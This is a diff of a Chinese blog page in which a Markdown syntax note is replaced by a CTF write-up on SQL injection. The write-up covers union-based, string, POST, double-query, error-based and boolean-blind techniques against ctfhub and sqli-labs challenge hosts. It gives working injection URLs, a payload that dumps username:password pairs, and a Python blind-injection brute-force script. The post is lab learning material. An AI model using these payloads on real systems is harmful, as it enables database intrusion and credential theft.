@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Markdown语法笔记, 0xahh的博客">
+    <meta name="keywords" content="SqlInjection, 0xahh的博客">
     <meta name="description" content="技术">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Markdown语法笔记 | 0xahh的博客</title>
+    <title>SqlInjection | 0xahh的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -286,12 +286,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Markdown语法笔记</h1>
+                    <h1 class="description center-align post-title">SqlInjection</h1>
                 </div>
             </div>
         </div>
@@ -408,14 +408,27 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/markdown/">
-                                <span class="chip bg-color">markdown</span>
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -424,7 +437,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-01
+                    2020-09-22
                 </div>
                 
 
@@ -433,14 +446,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    4.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    18 分
                 </div>
                 
 
@@ -455,153 +468,191 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>“#”用于标题，一个对应一级标题，两个对应二级标题，共六级</p>
-<h3 id="这是一个三级标题"><a href="#这是一个三级标题" class="headerlink" title="这是一个三级标题"></a>这是一个三级标题</h3><hr>
-<h4 id="字体以及段落"><a href="#字体以及段落" class="headerlink" title="字体以及段落"></a>字体以及段落</h4><p>“*”用于表示粗体，斜体，一对表示斜体，两对表示粗体，三对表示粗斜体，三个后回车是分隔线</p>
-<p><em>斜体</em>  <strong>粗体</strong> <strong><em>粗斜体</em></strong>  </p>
-<p>“~~”是删除线，括起来后是这样的  </p>
-<p><del>这是删除线</del> </p>
-<p>下划线使用html&lt;u&gt;,&lt;/u&gt;标签来进行使用，</p>
-<p><u>这是下划线</u></p>
-<p>脚注，是指当鼠标指向这里时会显示的标签[^]^后跟要注明的文本</p>
-<p>Markdown 支持有序列表和无序列表。</p>
-<p>无序列表使用星号(*<strong>**)、加号(</strong>+<strong>)或是减号(</strong>-**)作为列表标记，这些标记后面要添加一个空格，然后再填写内容：</p>
-<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><ul>
-<li>这是一个无需列表</li>
-<li>这是第二列</li>
-</ul>
-<p>有序列表使用数字并加上 <strong>.</strong> 号来表示，</p>
+                <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>sql注入是一种在ctf中比较常见的题型，在曾经的大家并没有注重安全的年代很多网站都有sql注入的漏洞，当然随着技术的发展，存在sql注入的网站越来越少，但其依旧是web安全中一大威胁，且一些题目中会包含相关步骤，需要了解掌握，以下主要记录各种手动注入的步骤</p>
+<p><strong><em>没有图片，还没解决图片上传的问题，就这样吧，下一篇再解决</em></strong> </p>
+<p>对于sql注入来说，我们一般会按照以下步骤</p>
 <ol>
-<li>这是第一</li>
-<li>这是第二</li>
+<li>判断是否存在注入（是否严格校验）<ol>
+<li>可控参数改变是否影响页面</li>
+<li>输入的sql语句是否能引发报错—通过报错可以看到数据库的一些语句痕迹</li>
+<li>能否消除报错（闭合）</li>
 </ol>
-<p>列表嵌套只需在子列表中的选项前面添加四个空格即可：</p>
+</li>
+<li>判断注入类型</li>
+<li>判断语句是否能被恶意修改</li>
+<li>是否能够成功执行</li>
+<li>获取想要的数据<ol>
+<li>数据库-》表-》字段-》值<ol>
+<li>当我们使用mysql时可以注意到，不止一个库，而其中的<strong>infomation_schema</strong> 库储存着<strong>所有库中的表</strong>的有关信息</li>
+<li>infomation_schema中有三个表储存着我们想要的信息<ol>
+<li>schemata表，该表中的<strong>schema_name</strong>字段包含了所有<strong>数据库的name信息</strong>，其它字段不做考虑，分别是编码和sql_path等，通过<strong>schema_name</strong>列来进行数据库的查询</li>
+<li>tables表，该表中的<strong>table_name</strong>字段包含了所有的库中所有的表的名称，且其中的table_schema列包含了所有的库的名称（有重复，因为和后面的table_name)相对应</li>
+<li>columns表，该表中的<strong>column_name</strong>字段包含了所有库中所有表的所有<strong>字段名称</strong>，其中的table_schema列包含了所有的库的名称，table_name列包含了所有的库中所有的表的名称</li>
+</ol>
+</li>
+<li>在通过这三个表依次进行查询后可以知道哪个库有哪些表有哪些字段，这时候就可以按照我们所需来进行查询<em>为什么不直接用columns表呢，既然其中的列已经涵盖了库，表，列的信息？因为字段冗余，不便于我们对信息的查看，当然也可以通过sql语句的构造来解决这个问题，直接查询columns表或许是一个优越的选择</em></li>
+</ol>
+</li>
+<li>在能够获取数据后，通过构造sql语句来进行查询，比如flag或者admin的账号和密码等敏感信息，或者在之后植入后门等。</li>
+</ol>
+</li>
+</ol>
+<h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><p>对于整数型注入，我们以ctfhub上的第一题整数型注入来进行实验以及记录</p>
+<p>首先记录整数型注入的简单原理</p>
+<p>最基础，通过?id=1’来进行判断  当加了单引号’后出现报错，说明可能存在注入点，  原理：正常语句时这样的：select * from table where id=1   select * from table where id=1’无法识别引号，会引起报错，<del>这样就可以判断他是一个整数型注入的点</del>，其实这样字符型也会报错，但需要判断的话需要看报错出现的提示，需要加双引号或者其他的东西来继续看结果才能判断</p>
+<p>下面来进行注入，查找flag</p>
 <ol>
-<li>这是第一<ul>
-<li>这是子列表</li>
-<li>第二行</li>
-</ul>
+<li><p>首先按照提示，输入一个参数：1，可以看到查询结果ID为1和data，此时的url为：</p>
+<p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1</code></p>
 </li>
-<li>这是第二<ul>
-<li>我这里没有使用添加空格，直接删除出现的3.再加*就可以了<ul>
-<li>还可以继续往里<ol>
-<li>可以多重嵌套</li>
+<li><p>加单引号后查询失败，可以看到一个sql语句：<code>select * from news where id=1&#39;</code>,说明有注入点，我们再加入#注释符可以成功执行，<strong>说明是一个整数型注入</strong>现在开始注入</p>
+</li>
+<li><p>首先要判断此时的表中有多少列的数据，可以使用order by或者union select</p>
+<ol>
+<li>order by 1如果成功说明一列，order by 2成功为两列，以此类推，order by 是按照第几列来排序的，这里使用了他的特性如果该列不存在则报错的属性来判断有几列</li>
+<li>union select是联合查询，是将查询组合到一起的操作，在判断时union select 1,2,4 这是试3列是否正确，这里的数字是几不重要</li>
+</ol>
+<p>实验后发现，当语句为<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1 order by 2</code></p>
+<p>时有输出，说明有该表有两列，此时就可以使用union seclect了</p>
+</li>
+<li><p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1 union select 1,user()</code></p>
+<p>此时我们想要的是简单查看一下user()但此时不会输出，因为显示的是id=1所查询到的，只要将id=1改为一个不可能查询到的数即可，比如-1，*若还不出则改变user()在union select中的位置，改变后查询成功</p>
+</li>
+<li><p>现在开始查询库，表，字段的信息：<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select 1,schema_name from information_schema.schemata</code></p>
+<p>可以查到一个库名，要想查看所有库怎么办？</p>
+<p>使用一个group_concat()这个函数的作用是将所有的子弹组合起来在一起输出，这里再记录一个concat_wx()函数，其作用是将不同子段组合在一起输出：concat_ws(‘:’,id,password)这里的意思是将id与password子段对应组合输出，二者中间以：分隔，再将这个函数放在group_concat()中，及可输出所有的对应id与password</p>
+<p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></p>
+<p>此时查询到Data: information_schema,performance_schema,mysql,sqli，说明有这几个库，接下来查表，我们来查sqli这个库中的表</p>
+<p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),group_concat(table_name) from information_schema.tables   where table_schema = &#39;sqli&#39;</code>(注意这里的table_schema=要加单引号，因为每加半天没出来)</p>
+<p>查询可以看到该库的表，其中发现了名为flag的表</p>
+<p>接下来就是查询字段了，我们来看flag这个表里有哪些字段<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),group_concat(column_name) from information_schema.columns   where table_schema = &#39;sqli&#39; and table_name=&#39;flag&#39;</code></p>
+<p>可以看到有一个字段：flag</p>
+<p>此时我们已经完成了探索，只需要将需要的flag取出来即可：<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),flag from sqli.flag</code></p>
+<p>即从对应的库的对应表中取出数据：ctfhub{63dcb9358daa938b5fdb1c976c04ca8b8436d6c2}</p>
+<p>拿到了flag</p>
+</li>
+</ol>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,flag from sqli.flag --+</code></p>
+<p>这是最后的结果，作为参考</p>
+<p>当我们输入1后可以看到（这是靶场特地放出来的，一般情况下不会放出需要自己去判断是什么样的注入），比如整数型加单引号报错后简单的#就可以消除报错，但字符型不行，需要在后面加–+来将原来的单引号注释掉才能成功执行，这说明这是一个字符型注入</p>
+<p>select * from news where id=’1’，这就体现出是字符报错</p>
+<ol>
+<li><p>判断出是字符型后就加–+来消除报错，之前 的单引号已经使id=’1’闭合了，所以–+注释掉之前的单引号<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39;  --+</code></p>
+<p>此时可看到执行成功，有输出，现在开始判断有多少列</p>
+</li>
+<li><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39;  order by 2--+</code>可以看到有两列，</p>
+</li>
+<li><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; union select 1,database()--+</code>此时输出发现有结果但不是我们想要的，因为输出的是通过id查到的东西，将其变为不可查到的东西，使用 and 1=0这样让id查找的值始终为false，就可以查找我们想要的了</p>
+<p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,database()--+</code></p>
+<p>可以看到当前的database为sqli</p>
+</li>
+<li><p>现在开始查询库，表，列</p>
+<p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(schema_name) from information_schema.schemata --+</code> 可以看到查询到了几个库：Data: information_schema,performance_schema,mysql,sqli，下面来查sqli库中的表<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39; --+</code></p>
+<p>可以看到有flag表和news表，我们来查flag表有哪些字段</p>
+<p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name =&#39;flag&#39; --+</code></p>
+<p>发现有flag字段，查出来就可以了<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,flag from sqli.flag--+</code></p>
+<p>字符型注入完成</p>
+</li>
+</ol>
+<h3 id="post型注入"><a href="#post型注入" class="headerlink" title="post型注入"></a>post型注入</h3><p>之前的都是get型注入，参数直接在url中就可以提现和更改，post型注入不同，其参数放在post表单里进行提交，一般来说登录框的提交就是post类型提交，原理还是一样的，检测是否能使其报错，报错后能否闭合，闭合后查去想要的数据，我们来具体过程如下，以sqli-labs中的第11题作为实验</p>
+<p>这里的</p>
+<ol>
+<li><p>在post注入中，可以使用hackbar的post提交表单来进行或者通过burp来抓包改包，这里使用hackbar来作为实验，首先需要看一下页面组成元素可以看到以下两个</p>
+<p>input type=”text” name=”uname” value=””</p>
+<p>input type=”text” name=”passwd” value=””</p>
+<p>可以看到两个框的输入，一个子段名为uname，一个为passwd，开始检查有无注入点：</p>
+</li>
+<li><p>使用hackbar的postdata，放入参数<code>uname=1&#39;&amp;passwd=1</code>，执行，可以看到报错，说明存在报错，简单说一下这里的语法，加入单引号，引起报错，因为使其不闭合</p>
+</li>
+<li><p>接下来要使其闭合，首先使用#<code>uname=1&#39; #&amp;passwd=1</code>,可以看到报错消失了，可以知道这是一个整型注入，我们知道要想登录成功需要为true所以我们使用<code>uname=1&#39; or 1 #&amp;passwd=1</code>，可以看到这时第一个uname处通过or已经成功为1了，此时已经可以登录成功了，接下来就开始查询想要的数据，去掉or 1 <code>uname=1&#39;  union select database(),1 #&amp;passwd=1</code>,就可以查到database()了,接下来就可以查询别的<code>uname=1&#39;  union select database(),group_concat(schema_name) from information_schema.schemata #&amp;passwd=1</code>,找到了有一个security库</p>
+</li>
+<li><p><code>uname=1&#39;  union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; #&amp;passwd=1</code></p>
+<p>接下来就可以看到该表有哪些列了</p>
+<p><code>uname=1&#39;  union select database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#&amp;passwd=1</code></p>
+<p>接着查到有username和password列，接下来直接查想要的就好了</p>
+<p><code>uname=1&#39;  union select database(),group_concat(concat_ws(&#39;:&#39;,username,password)) from security.users #&amp;passwd=1</code></p>
+</li>
+</ol>
+<h3 id="双注入"><a href="#双注入" class="headerlink" title="双注入"></a>双注入</h3><ul>
+<li><p><strong>group by</strong> 语句时一个分组语句，将要选择的数据按照一个条件来进行分组，使其聚合在一起，</p>
+</li>
+<li><p>**concat()**函数用于将两个字符串连接为一个字符串,括号内CONCAT(‘FIRST ‘, ‘SECOND’)，这样输出时二者并在一起输出。</p>
+</li>
+</ul>
+<p>双注入时我们在使用之前的手段即使用union select后无法在页面显示我们想要的信息时，通过在我们想要的地方报错使用子select，将敏感信息报错出来，就是双注入</p>
+<p>双注入就是利用了group by和concat以及一个随机数<strong>floor(rand()*2)即0或1<strong>作为group by的条件，因为如果两次都取得了同一个值（如两次0）就会产生报错，这时候通过concat，将要查询的字段</strong>一个select语句，所以叫双注入**放在concat中，就在报错信息中被放出来了，这样就可以进行查询了，示例语句如下：<code>?id=1 union select 1,2 from infomation_schema group by concat(floor(rand() *2),(select table_name from infomation_shcema.tables))</code>**后续发现使用rand(0)*2更可控，</strong></p>
+<p>这里以ctfhub中的技能树中的报错注入来做一个讲解</p>
+<p><code>http://challenge-65678edc24f805b1.sandbox.ctfhub.com:10080/?id=1 union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),(select flag from flag))</code></p>
+<p>这里的union select直接使用时无法获得数据的，需要后续的报错来进行报错。</p>
+<p>但这里有一个问题，每一次的双注入报错，会不允许一次爆出多行数据，需要一行一行的找，需要在子select中使用 limit 0,1 limit 1,1一行一行的试，这里解出题是因为其库，表，字段的结构简单，但如果是一个未知的环境，会很难。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>就是通过报错，将敏感信息爆出来，使用一些新的函数，可以使得报错注入更加简单，这里介绍三个函数来进行报错，</p>
+<ol>
+<li><strong>extractvalue()</strong>:从目标XML中返回包含所查询值的字符串，</li>
+<li>extractvalue(XML_document,XPath_string);<ol>
+<li>第一个参数，是string格式，为XML文档名称，</li>
+<li>第二个参数，XPath_string（XPath格式的字符串）</li>
 </ol>
 </li>
-</ul>
-</li>
-</ul>
+<li>updatexml(XML_document,XPath_string,new_value)<ol>
+<li>第一个参数，是string格式，为XML文档名称，</li>
+<li>第二个参数，XPath_string（XPath格式的字符串）</li>
+<li>第三个参数，new_value，string格式，替换查找到的符合条件的数据</li>
+</ol>
 </li>
 </ol>
-<h4 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h4><p>区块，使用&gt;来区分，一个&gt;代表一个区块，也可以多重嵌套，注意要放在每行开头</p>
-<blockquote>
-<p>第一区块</p>
-<p>这是区块中的内容</p>
-<blockquote>
+<p>但在这里我们并不正确的使用这些函数，而是让他们报错，在报错的地方来看到敏感信息，</p>
+<p>接下来来看这些语句的使用，还是以ctfhub的报错注入作为例子</p>
 <ul>
-<li>这是第二区块</li>
+<li>开始的判断报错不再展示，还是需要先判断有多少列，然后使用union select</li>
 </ul>
-</blockquote>
-</blockquote>
-<p>还可以在区块中使用列表</p>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>对于一个很短的代码片段，可以将其用两个“esc”下方键的·括起来，效果是这样的：<code>printf(&quot;helloworld/n&quot;);</code>这样的高亮进行标记</p>
-<p>也可以使用一个TAB键或者四个空格作为代码</p>
-<p>​    这是使用tab</p>
-<p>​    这是使用四个空格</p>
-<p>使用三对</p>
-<p>“esc”下方键包裹起来语句，就可以是一个代码块了，还可以指定语言</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre>
-<p>这就是一个代码块了</p>
-<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>使用[     ]（  ），其中[   ]中是链接的名称(    )中是链接的地址</p>
-<p>或者&lt;   &gt;中直接输入链接地址</p>
-<p><a target="_blank" rel="noopener" href="https://www.baidu.com/">百度</a> </p>
-<p><a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a></p>
-<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p><img src="E:/From_C/桌面/tyoora/图片地址" alt="alt 属性文本"></p>
-<p>这是图片格式</p>
-<p>开头一个感叹号 !<br>接着一个方括号，里面放上图片的替代文字<br>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 属性的文字。</p>
-<p>使用实例：</p>
-<p><img src="http://static.runoob.com/images/runoob-logo.png" alt="RUNOOB 图标"></p>
-<pre><code>![RUNOOB 图标](http://static.runoob.com/images/runoob-logo.png)</code></pre>
-<p>Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 <img> 标签。</p>
-<pre><code>&lt;img src=&quot;http://static.runoob.com/images/runoob-logo.png&quot; width=&quot;50%&quot;&gt;</code></pre>
-<img src="http://static.runoob.com/images/runoob-logo.png" width="50%">
-
-
-
-<p>注意，在typora中还可以直接将图片复制进来，很方便</p>
-<h4 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h4><p>Markdown 制作表格使用 <strong>|</strong> 来分隔不同的单元格，使用 <strong>-</strong> 来分隔表头和其他行。</p>
-<p>语法格式如下：</p>
-<pre><code>|  表头   | 表头  |
-|  ----  | ----  |
-| 单元格  | 单元格 |
-| 单元格  | 单元格 |</code></pre>
-<p>这就是一个列表的展示</p>
-<table>
-<thead>
-<tr>
-<th>表头</th>
-<th>表头</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>单元格</td>
-<td>单元格</td>
-</tr>
-<tr>
-<td>单元格</td>
-<td>单元格</td>
-</tr>
-</tbody></table>
+<p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,(select version()))</code>这里使用extractvalue（），第一个参数随便写个1，重点就是第二个参数，正常时应该使用一个字符串，这里用他来报错，这里就可以查出其version了，但注意到，这时查出的语句为：XPATH syntax error: ‘.22-MariaDB-0+deb10u1’，报错正常，但可以看到显示不全，这时候我们就需要加入一个concat函数来拼接一下，拼接0x74即一个’~’号，就可以查到了所有的信息了，</p>
 <ul>
-<li><strong>-:</strong> 设置内容和标题栏居右对齐。</li>
-<li><strong>:-</strong> 设置内容和标题栏居左对齐。</li>
-<li><strong>:-:</strong> 设置内容和标题栏居中对齐。</li>
+<li><p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select version())))</code>这样就可以看到所有的信息了，现在就可以开始查想要的东西了，注意，现在来说我们还是只能一条一条的查，不能group_concat，还是只有一条一条的查<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))</code></p>
+</li>
+<li><p>这样可以看到本库里的表，看到有一个flag表，查这个表，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1)))</code>看到只有一个flag字段，那就只有这里了，查出来就行了，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select flag from flag)))</code></p>
+</li>
+<li><p>但我们发现这时候的flag不全，只有一部分，这是因为用xpath报错值显示32位，这时候就需要使用一个函数，叫做<strong>mid()</strong>,</p>
+</li>
 </ul>
-<pre><code>| 左对齐 | 右对齐 | 居中对齐 |
-| :-----| ----: | :----: |
-| 单元格 | 单元格 | 单元格 |
-| 单元格 | 单元格 | 单元格 |</code></pre>
-<table>
-<thead>
-<tr>
-<th align="left">左对齐</th>
-<th align="right">右对齐</th>
-<th align="center">居中对齐</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">单元格</td>
-<td align="right">单元格</td>
-<td align="center">单元格</td>
-</tr>
-<tr>
-<td align="left">单元格</td>
-<td align="right">单元格</td>
-<td align="center">单元格</td>
-</tr>
-</tbody></table>
-<h4 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h4><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。</p>
-<p>目前支持的 HTML 元素有：<code>&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;</code>等 ，</p>
-<p>Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：</p>
-<p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p>
-<pre><code>\   反斜线
-`   反引号
-*   星号
-_   下划线
-&amp;#123;&amp;#125;  花括号
-[]  方括号
-()  小括号
-#   井字号
-+   加号
--   减号
-.   英文句点
-!   感叹号</code></pre>
-<p>f8为专注模式，f9为打字机模式，可以让在编写的行永远在最中间</p>
+<pre><code>mid(str,start,[length])  str:截取的字符串  start:起始位置  length:截取的长度，可以忽略</code></pre>
+<p>将子select当做str参数，start从32开始，就可以取到flag后半部分了<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,mid((select flag from flag),32)))</code></p>
+<ul>
+<li>我们也可以使用updatexml()函数，区别只是最后多一个参数，那个参数写1就行了</li>
+</ul>
+<p>报错注入差不多就这样了</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>什么是盲注，盲注就是在即使页面正常运行时也不会在页面上显示出数据，即使注入成功无法直接的查询到想要的数据，只能通过true or false来判断查询的单一字符是否正确。我们会通过该ascii码表来对需要的数据进行一一比对，在比对为真时就可以知道这一位的数据是我们想要的了。</p>
+<p>我们在判断时会通过真假来，这时我们需要在确认了有注入点以及判断了是哪种类型的注入后，在为假的条件后（比如?id=1为真，?id=1’）使用 or 语句的后续语句真与否来判断。后续语句就是我们想要知道的信息了，写一条语句作为分析</p>
+<ul>
+<li>ascii()是将其中的字符转换为ascii对应的数字，如“A”会转换为65，这样方便比对，</li>
+<li>substr(strings|express,m,[n])用于语句截断，<ul>
+<li>第一个参数是要被截断的字符串，</li>
+<li>第二个是开始截断的位数，</li>
+<li>第三个是偏移量，即一次截断多少位</li>
+</ul>
+</li>
+</ul>
+<p><code>?id=1&#39; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit0,1)=100#</code></p>
+<p>对语句做分析，在判断注入了以后使用#来消除报错，然后使用or语句，来进行布尔判断，括号内，可以看出我们现在在查的是当前数据库下的第一个表的名（通过limit)，而substr在判断这第一个表的名的第一个字母是否为ascii值为100的字符，如果是，则会显示true，这时我们就知道了第一个字符，然后依次试验下去，就知道了整个表名（是很繁琐以及不切实际，但原理确实是这样的，可以使用burp等自动化工具来爆破或者直接sqlmap，这里只是讲解原理）</p>
+<p>下面通过ctfhub的布尔盲注来进行讲解</p>
+<p><code>http://challenge-23383a60e8712835.sandbox.ctfhub.com:10080/?id=1 and (select ascii(substr(flag,1,1)) from flag)=99</code></p>
+<p>我已经直接查flag了，因为的数据库结构和之前是一样的，因为过程一样所以之前的查库查表不在进行，我们输入了上述语句后可以看到网页给出提示<strong>query_success</strong>，说明我们flag表的flag字段的第一个字符时小写的C，因为ascii码为99。接下来怎么办，总不能自己一个一个实验吧，我们选择使用burp suit进行爆破，以两个字段，即substr里的第二个参数和最后的ascii值判断作为爆破的点，依次爆破就能得到flag了，（这是按照我学的视频里的方法，总感觉太慢了，所以我决定去看writeup，发现writeup是写了脚本，那我也写脚本吧，用个requests库就可以了，还不咋会，照着写了一个）</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+name<span class="token operator">=</span> <span class="token string">''</span>
+mark <span class="token operator">=</span> <span class="token string">'query_success'</span>
+urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-62b5ddccaa603532.sandbox.ctfhub.com:10080/?id='</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#substr子段</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#ascii值子段</span>
+        url <span class="token operator">=</span> urlOpen<span class="token operator">+</span><span class="token string">'1 and (select ascii(substr(flag,%d,1)) from flag)=%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#依次判断</span>
+        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> mark <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#可以知道比对成功就是query_sucess,所以以此作为判断</span>
+            name<span class="token operator">=</span>name<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+
+</code></pre>
+<p>最后就可以输出了flag了，前面查询库，表也和这个类似，只是sql语句换一下罢了，这里就偷懒了</p>
 
             </div>
             <hr/>
@@ -617,7 +668,7 @@ _   下划线
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">0xhowahh</a>
+                    <a href="/about" rel="external nofollow noreferrer">0xahh</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -627,7 +678,7 @@ _   下划线
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://119.23.18.158/2020/09/01/markdown/">http://119.23.18.158/2020/09/01/markdown/</a>
+                    <a href="http://119.23.18.158/2020/09/22/sqlinjection/">http://119.23.18.158/2020/09/22/sqlinjection/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -640,7 +691,7 @@ _   下划线
                     本博客所有文章除特別声明外，均采用
